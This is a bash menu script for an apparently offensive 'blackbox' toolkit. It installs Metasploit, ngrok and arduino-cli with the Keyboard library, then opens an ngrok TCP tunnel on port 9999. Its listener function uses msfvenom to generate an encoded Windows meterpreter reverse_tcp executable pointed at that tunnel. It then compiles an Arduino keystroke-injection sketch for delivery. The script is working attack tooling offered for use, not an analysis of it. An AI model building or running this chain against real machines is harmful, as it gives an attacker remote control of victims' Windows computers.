#!/bin/bash

# Control the output
trap ctrl_c INT

function ctrl_c() {
    echo -e "\033[33m[WARNING]\033[37m Exiting..."
    exit
}

function banner() {
    clear
    source config/banner.sh
}

function dependencies()
{
    echo -e "\033[32m[INFO]\033[37m Installing dependencies"
    sleep 0.5

    # Metasploit Installation
    echo -e "\033[32m[INFO]\033[37m Installing Metasploit..."
    sleep 0.5
    echo -e "\033[33m[WARNING]\033[37m Consider installing: Metasploit Framework Version: 6.2.26-dev"
    sleep 0.5
    which msfconsole > /dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "\033[33m[WARNING]\033[37m Metasploit found. Avoiding installation"
        sleep 0.5
    else
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall > /dev/null 2>&1
        metasploit=$?
        
        if [[ $metasploit -eq 0 ]]; then
            echo -e "\033[32m[INFO]\033[37m Metasploit installed successfully"
            sleep 0.5
        else
            echo -e "\033[31m[ERROR]\033[37m Seems that metasploit could not be installed"
            sleep 0.5
        fi    
    fi

    # Ngrok Installation
    echo -e "\033[32m[INFO]\033[37m Installing ngrok..."
    sleep 0.5
    which ngrok > /dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "\033[33m[WARNING]\033[37m ngrok found. Avoiding installation"
        sleep 0.5
    else   
        curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update -y && sudo apt install ngrok -y > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\033[32m[INFO]\033[37m ngrok installed successfully"
            sleep 0.5
        else
            echo -e "\033[31m[ERROR]\033[37m Seems that ngrok could not be installed"
            sleep 0.5
        fi
    fi

    # OpenSSH Installation
    echo -e "\033[32m[INFO]\033[37m Installing OpenSSH"
    which ssh > /dev/null
    sleep 0.5
    if [[ $? -eq 0 ]]; then
        echo -e "\033[33m[WARNING]\033[37m SSH Found. Avoiding installation"
        sleep 0.5
    else
        sudo apt install openssh-server -y > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\033[32m[INFO]\033[37m OpenSSH installed successfully"
            sleep 0.5
        else
            echo -e "\033[31m[ERROR]\033[37m Seems that OpenSSH could not be installed"
            sleep 0.5
        fi
    fi

    # Python3 Installation
    echo -e "\033[32m[INFO]\033[37m Installing Python 3"
    which python3 > /dev/null
    sleep 0.5
    if [[ $? -eq 0 ]]; then
        echo -e "\033[33m[WARNING]\033[37m Python3 Found. Avoiding installation"
        sleep 0.5
    else
        sudo apt install python3.8 -y > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\033[32m[INFO]\033[37m Python installed successfully"
            sleep 0.5
        else
            echo -e "\033[31m[ERROR]\033[37m Seems that Python could not be installed"
            sleep 0.5
        fi
    fi

    # Arduino Installation
    echo -e "\033[32m[INFO]\033[37m Installing Arduino..."
    which arduino > /dev/null
    sleep 0.5
    if [[ $? -eq 0 ]]; then
        echo -e "\033[33m[WARNING]\033[37m Arduino found. Avoiding installation"
        sleep 0.5
    else
        git clone https://github.com/arduino/arduino-cli.git > /dev/null 2>&1
        echo -e "\033[32m[INFO]\033[37m Adding arduino to /usr/bin"
        sudo mv arduino-cli/bin/arduino-cli /usr/bin > /dev/null 2>&1
        sudo rm -r arduino-cli/ > /dev/null 2>&1
        sleep 0.5
        echo -e "\033[32m[INFO]\033[37m Installing necessary packages... "
        sudo arduino-cli core install arduino:avr > /dev/null 2>&1
        sudo arduino-cli lib install Keyboard > /dev/null 2>&1
        sleep 0.5
    fi
}

function token()
{
    # Token is needed for create a HTTP Connection. Please consider register in ngrok.io for do it.
    token=$(cat credentials.txt)
    if [ ! -s credentials.txt ]; then
        echo -e "\033[31m[ERROR]\033[37m Please add your ngrok token for continue..."
        exit
    else
        ngrok config add-authtoken $token > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
            echo -e "\033[32m[INFO]\033[37m Token added successfully"
        else
            echo -e "\033[31m[ERROR]\033[37m Something went wrong adding the ngrok token."
        fi
    fi   
}


function listener()
{
    # Ngrok will start listening in the host and port given.
    port=9999
    nohup ngrok tcp $port --log=stdout > logs/ngrok.log 2> logs/foo.err < /dev/null &
    if [[ $? -eq 0 ]]; then
        export port=$port
        echo -e "\033[32m[INFO]\033[37m Port listener configured successfully"
        # Bugged, next line is necessary for work... Yet i am not able to solve it.
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$tunnel LPORT=$tunnelport --platform windows -a x86 -e x86/shikata_ga_nai -f exe > bash-bunny.exe 2>/dev/null > /dev/null
        bash config/listener.sh
    else
        echo -e "\033[31m[ERROR]\033[37m Something went wrong setting the port"
    fi
}

function kill()
{
    # Kill all the connections created
    echo -e "\033[32m[INFO]\033[37m Killing connections before start"
    killall ngrok > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "\033[32m[INFO]\033[37m All ngrok connections killed successfully"
        sleep 0.5
    else
        echo -e "\033[33m[WARNING]\033[37m Seems that you don't have any active ngrok connection"
        sleep 0.5
    fi
    
    killall ssh > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "\033[32m[INFO]\033[37m All ssh connections killed successfully"
        sleep 0.5
    else
        echo -e "\033[33m[WARNING]\033[37m Seems that you don't have any active ssh connection"
        sleep 0.5
    fi

    killall python3 > /dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo -e "\033[32m[INFO]\033[37m All HTTP Python connections killed successfully"
        sleep 0.5
    else
        echo -e "\033[33m[WARNING]\033[37m Seems that you don't have any active HTTP Python connection"
        sleep 0.5
    fi
}

function upload()
{
    # This function will compile the arduino
    # With the given parameters

    echo -e "\033[32m[INFO]\033[37m Uploading Arduino Script"
    bash config/arduino-builder.sh
    sleep 0.5
}

# Start here


banner
echo "--> Control Panel <--"
echo ""
echo -e "\033[34m1)\033[37m Install dependencies"
sleep 1
echo -e "\033[34m2)\033[37m Load ngrok token"
sleep 1
echo -e "\033[34m3)\033[37m Configure your blackbox"
sleep 1
echo -e "\033[34m4)\033[37m Exit"
sleep 1

echo ""
read -p "Select an option >> " option

case $option in
    1)
        dependencies
        ;;
    2)
        token
        ;;
    3)
        kill
        listener
        upload
        ;;
    4)
        exit
        ;;
    *)
        echo "Invalid option"
        ;;
esac